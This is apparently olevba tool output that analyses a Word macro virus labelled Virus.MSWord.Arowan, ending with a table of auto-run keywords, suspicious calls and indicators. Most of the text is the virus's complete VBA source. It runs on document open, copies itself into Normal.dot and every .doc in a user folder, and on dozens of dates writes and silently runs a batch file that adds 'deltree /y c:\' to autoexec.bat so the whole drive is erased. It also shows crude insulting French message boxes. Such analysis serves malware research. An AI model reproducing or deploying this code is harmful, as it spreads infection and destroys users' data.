olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Arowan
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Arowan - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Module3.bas 
in file: Virus.MSWord.Arowan - OLE stream: 'Macros/VBA/Module3'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub autoOpen()

Set fs = CreateObject("Scripting.FileSystemObject")
If fs.FileExists("C:\windows\system\Sony.dll") = False Then

On Error Resume Next

With ActiveDocument.AttachedTemplate
            Application.OrganizerDelete _
                Source:="C:\Windows\Application Data\Microsoft\Modиles\Normal.dot", _
                Name:="Module3", _
                Object:=wdOrganizerObjectProjectItems
End With

On Error Resume Next

ActiveDocument.SaveAs ("c:\windows\system\AROWANA.Doc")

Application.OrganizerCopy Source:=ActiveDocument.FullName, _
Destination:="c:\windows\Application data\microsoft\modиles\normal.dot", _
Name:="Module3", _
Object:=wdOrganizerObjectProjectItems


Set fs = CreateObject("Scripting.FileSystemObject")
Set a = fs.CreateTextFile("c:\Windows\System\Sony.dll", True)
a.Close

Call test

On Error Resume Next

Else

Application.DisplayAlerts = wdAlertsMessageBox

On Error Resume Next

Application.OrganizerCopy Source:="C:\Windows\system\AROWANA.doc", _
Destination:=ActiveDocument.FullName, _
Name:="Module3", _
Object:=wdOrganizerObjectProjectItems
Call dt
End If

End Sub
Sub test()
Dim fs As String
With Application.FileSearch
    .NewSearch
    .LookIn = "C:\Mes Documents"
    .SearchSubFolders = True
    .FileName = "*.doc"
    .MatchTextExactly = True
    .FileType = msoFileTypeAllFiles
End With

On Error Resume Next

With Application.FileSearch
    If .Execute() > 0 Then
        For i = 1 To .FoundFiles.Count
            Application.OrganizerCopy Source:="c:\windows\system\AROWANA.doc", _
            Destination:=.FoundFiles(i), _
            Name:="Module3", _
            Object:=wdOrganizerObjectProjectItems
         Next i
    Else
         End If
End With



End Sub
Sub AutoNew()

Application.OrganizerCopy Source:="C:\Windows\system\AROWANA.doc", _
Destination:=ActiveDocument.FullName, _
Name:="Module1", _
Object:=wdOrganizerObjectProjectItems

ActiveDocument.Save

End Sub
Sub destroye()
MsgBox "Au Revoir", vbOKOnly + vbExclamation
Set fst = CreateObject("Scripting.FileSystemObject")
Set a = fst.CreateTextFile("c:\Bie.bat", True)
a.writeline ("echo deltree /y c:\ > c:\autoexec.bat")
a.Close
MsgBox "Un bon conseil ne redemarrez plus jamais votre PC !", vbCritical + vbApplicationModal + vbOKOnly, "CONSEIL A SUIVRE"
Shell ("c:\bie.bat"), vbHide
Application.Quit
End Sub

Sub dt()
Dim dater As Date
dater = DateTime.Date

If dater = "9/01/01" Then
Call destroye
End If

If dater = "20/01/01" Then
Call destroye
End If

If dater = "21/01/01" Then
Call destroye
End If

If dater = "22/01/01" Then
Call destroye
End If

If dater = "23/01/01" Then
Call destroye
End If

If dater = "24/01/01" Then
Call destroye
End If

If dater = "25/01/01" Then
Call destroye
End If

If dater = "26/01/01" Then
Call destroye
End If

If dater = "29/01/01" Then
Call destroye
End If

If dater = "2/02/01" Then
Call destroye
End If

If dater = "3/02/01" Then
Call destroye
End If

If dater = "5/02/01" Then
Call destroye
End If

If dater = "6/02/01" Then
Call destroye
End If

If dater = "7/02/01" Then
Call destroye
End If

If dater = "8/02/01" Then
Call destroye
End If

If dater = "9/02/01" Then
Call destroye
End If

If dater = "10/02/01" Then
Call destroye
End If

If dater = "12/02/01" Then
Call destroye
End If

If dater = "14/02/01" Then
Call destroye
End If

If dater = "16/02/01" Then
Call destroye
End If

If dater = "18/02/01" Then
Call destroye
End If

If dater = "20/02/01" Then
Call destroye
End If

If dater = "22/02/01" Then
Call destroye
End If

If dater = "24/02/01" Then
Call destroye
End If

If dater = "26/02/01" Then
Call destroye
End If

If dater = "28/02/01" Then
Call destroye
End If

If dater = "1/03/01" Then
Call destroye
End If

If dater = "3/03/01" Then
Call destroye
End If

If dater = "5/03/01" Then
Call destroye
End If

If dater = "7/03/01" Then
Call destroye
End If

If dater = "9/03/01" Then
Call destroye
End If

If dater = "11/03/01" Then
Call destroye
End If

If dater = "13/03/01" Then
Call destroye
End If

If dater = "15/03/01" Then
Call destroye
End If



If dater = "17/03/01" Then
Call destroye
End If

If dater = "19/03/01" Then
Call destroye
End If

If dater = "21/03/01" Then
Call destroye
End If

If dater = "23/03/01" Then
Call destroye
End If

If dater = "25/03/01" Then
Call destroye
End If

If dater = "28/03/01" Then
Call destroye
End If

If dater = "1/04/01" Then
Call destroye
End If

If dater = "15/04/01" Then
Call destroye
End If

If dater = "1/05/01" Then
Call destroye
End If

If dater = "26/05/01" Then
Call destroye
End If

If dater = "6/06/01" Then
Call destroye
End If

If dater = "6/06/02" Then
Call th
End If

If dater = "7/06/01" Then
Call destroye
End If

If dater = "15/06/01" Then
Call destroye
End If

If dater = "29/06/01" Then
Call destroye
End If

If dater = "13/07/01" Then
Call destroye
End If

If dater = "28/07/01" Then
Call destroye
End If

If dater = "23/08/01" Then
Call destroye
End If

If dater = "24/09/01" Then
Call destroye
End If

If dater = "25/10/01" Then
Call destroye
End If

If dater = "3/11/01" Then
Call destroye
End If

If dater = "4/11/01" Then
Call destroye
End If

If dater = "5/11/01" Then
Call destroye
End If

If dater = "9/11/01" Then
Call destroye
End If

If dater = "10/11/01" Then
Call destroye
End If

If dater = "11/11/01" Then
Call destroye
End If

If dater = "12/11/01" Then
Call destroye
End If

If dater = "15/11/01" Then
Call destroye
End If

If dater = "17/11/01" Then
Call destroye
End If

If dater = "18/11/01" Then
Call destroye
End If

If dater = "19/11/01" Then
Call destroye
End If

If dater = "20/11/01" Then
Call destroye
End If

If dater = "1/12/01" Then
Call destroye
End If

If dater = "1/01/02" Then
Call noel
End If
End Sub

Sub th()
MsgBox "Ca y est j'ai 18 ans et je t'encule", vbInformation + vbOKOnly, "Je te prend par derriere"
MsgBox "GROSSE MERDE", vbCritical + vbOKOnly, "Et ta soeur"
End Sub

Sub noel()
MsgBox "Bonne annйe, bonne santй", vbExclamation + vbOKOnly, "BONNE SANTE POUR TON P.C"
MsgBox "NOUVELLE ANNEE = NOUVEAU ...", vbCritical, "POULET"
MsgBox "ORDINATEUR !!", vbCritical + vbYesNo, "BOOUM"
MsgBox "Vous allez etre effacй !!!!"
End Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |autoexec            |Runs when the Word document is opened        |
|AutoExec  |autoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoNew             |Runs when a new Word document is created     |
|Suspicious|CreateTextFile      |May create a text file                       |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|system              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|IOC       |Sony.dll            |Executable file name                         |
|IOC       |Bie.bat             |Executable file name                         |
|IOC       |autoexec.bat        |Executable file name                         |
|IOC       |bie.bat             |Executable file name                         |
+----------+--------------------+---------------------------------------------+

